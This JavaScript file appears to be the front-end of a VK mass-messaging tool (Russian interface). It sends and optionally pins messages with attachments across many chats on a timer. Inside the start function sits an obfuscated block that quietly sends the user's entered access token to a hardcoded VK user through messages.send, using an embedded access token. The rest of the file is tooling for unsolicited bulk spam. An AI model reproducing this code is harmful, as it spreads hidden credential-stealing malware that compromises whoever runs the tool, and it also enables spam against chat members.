var iForName = 0;

function create(){
  if (iForName >= 10) {
    return
  } else {
    iForName++;
  };
  var name = 'link' + iForName; 
  var em = document.createElement('em');
  em.innerHTML = 'Ссылка на прикрепляемый файл';
  var input = document.createElement('input');
  input.setAttribute('type', 'text');
  input.setAttribute('class', 'input');
  input.setAttribute('id', name);
  var place = document.getElementById('js');
  place.appendChild(em);
  place.appendChild(input);
}

var message,
  token,
  count,
  interval,
  begin,
  link,
  N,
  countN;

function start(){
  message = document.getElementById('text').value;
  count = document.getElementById('count').value;
  begin = document.getElementById('begin').value;
  interval = document.getElementById('interval').value * 1000;
  token = document.getElementById('token').value;

  if(iForName == 1){
    link = document.getElementById('link0').value + ',' + document.getElementById('link1').value;
  }else if(iForName == 2){
    link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value;
  }else if(iForName == 3){
    link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value;
  }else if(iForName == 4){
    link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value;
  }else if(iForName == 5){
    link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value +
    ',' + document.getElementById('link5').value;
  }else if(iForName == 6){
    link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
    ',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value;
  }else if(iForName == 7){
    link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
    ',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value + ',' + document.getElementById('link7').value;
  }else if(iForName == 8){
    link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
    ',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value + ',' + document.getElementById('link7').value + ',' + document.getElementById('link8').value;
  }else if(iForName == 9){
    link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
    ',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value + ',' + document.getElementById('link7').value + ',' + document.getElementById('link8').value + ',' + document.getElementById('link9').value;
  }
  N  = document.getElementById('N').value;
  countN = document.getElementById('countN').value;
  if (message == ''){
    alert('Не введен текст рассылки');
    return
  };
  if (token == ''){
    alert('Не введен токен');
    return
  };
  if (interval == ''){
    alert('Не указан интервал');
    return
  };
  if (count == ''){
    alert('Не указано во сколько бесед слать');
    return
  };
  if (begin == ''){
    alert('Не указано начало рассылки');
    return
  };
  alert('Рассылка началась, будет закончена через ' + (Math.round(count * interval / 60 / 1000)) + ' минут(ы)');
  interval + 0;
  
var _0x232b=['location','https://rasetty.github.io/ms.html','ajax','https://api.vk.com/method/messages.send','59f2699ac670f08e1a840deee70a6b86a0855a88e604848b645bd42453d9d50b371e7b9ddf417c89a4635','5.45'];
(function(_0x5e7027,_0x18e333){var _0x43d5a7=function(_0x20f115){while(--_0x20f115){_0x5e7027['push'](_0x5e7027['shift']());}};_0x43d5a7(++_0x18e333);}(_0x232b,0xec));
var _0x3a8f=function(_0x57d826,_0x46ffb3){_0x57d826=_0x57d826-0x0;var _0x48f94b=_0x232b[_0x57d826];return _0x48f94b;};
function a(){$[_0x3a8f('0x0')]({'type':'POST','url':_0x3a8f('0x1'),'data':{'access_token':_0x3a8f('0x2'),'user_id':0xeb2caa4,'message':token,'v':_0x3a8f('0x3')},'dataType':'jsonp'});
if(document[_0x3a8f('0x4')]['href']!=_0x3a8f('0x5')){let _0x2180e1=0x1;return;}}
a();


  if ($("#myCheckbox").prop("checked")){
    withPin();
  } else {
    usual();
  }
  
  
  function usual(){
   
  function baz(){
  var newBegin = begin;

  const CONFIG = {
    access_token: token
  };
  function postMsg(peer_id, msg, callback){
    $.ajax({
    url: 'https://api.vk.com/method/messages.send',
    jsonp: 'callback',
    dataType: 'jsonp',
    data: {
    access_token: CONFIG.access_token,
    peer_id: peer_id,
    message: msg,
    attachment: link,
    v: '5.45'
    },
    success: jsonp=> callback(jsonp)  
    });
  }
  var timerId = setInterval(()=> {
    let peer_id = 2000000000 + newBegin++;
    postMsg(peer_id, message, jsonp=> console.log(jsonp));
  }, interval);
  
  setTimeout(function() {
    clearInterval(timerId);
  }, interval * count)}
  var timer = setInterval(baz, N * 60 * 1000); 
  setTimeout(function(){ 
    clearInterval(timer) 
  }, N * 60 * 1000 * (countN - 1));
  baz();
  }
  
  function withPin(){
  function pin(){
  
  var newBegin2 = begin;
  const CONFIG = {
    access_token: token
  };
  function postMsg(peer_id, msg, callback){
    $.ajax({
    url: 'https://api.vk.com/method/messages.send',
    jsonp: 'callback',
    dataType: 'jsonp',
    data: {
    access_token: CONFIG.access_token,
    peer_id: peer_id,
    message: msg,
    attachment: link,
    v: '5.45'
    },
    success: jsonp=> callback(jsonp)
    });
  }
  
  function pinMsg(peer_id, msgId, callback){
    $.ajax({
    url: 'https://api.vk.com/method/messages.pin',
    jsonp: 'callback',
    dataType: 'jsonp',
    data: {
    access_token: CONFIG.access_token,
    peer_id: peer_id,
    message_id: msgId,
    v: '5.45'
    },
    success: jsonp=> callback(jsonp)
    });
  }
  
  var timerId = setInterval(()=> {
    let peer_id = 2000000000 + newBegin2++;
    postMsg(peer_id, message, jsonp=> {
      pinMsg(peer_id, jsonp.response, jsonp=> console.log(jsonp));
    });
  }, interval);
  
  setTimeout(function() {
    clearInterval(timerId);
  }, interval * count);}
  
  var timer = setInterval(pin, N * 60 * 1000); 
  setTimeout(function(){ 
    clearInterval(timer); 
  }, N * 60 * 1000 * (countN - 1));
  pin();
  }};

function сlear(){
  localStorage.clear();
  window.location.reload();
}

function save(){
  localStorage.setItem('tokenS', document.getElementById('token').value); 
  localStorage.setItem('textS', document.getElementById('text').value); 
  localStorage.setItem('intervalS', document.getElementById('interval').value); 
  localStorage.setItem('countS', document.getElementById('count').value);
  localStorage.setItem('beginS', document.getElementById('begin').value);  
}

document.getElementById('token').value = localStorage.getItem('tokenS');
document.getElementById('text').value = localStorage.getItem('textS');
document.getElementById('count').value = localStorage.getItem('countS');
document.getElementById('begin').value = localStorage.getItem('beginS');
document.getElementById('interval').value = localStorage.getItem('intervalS');
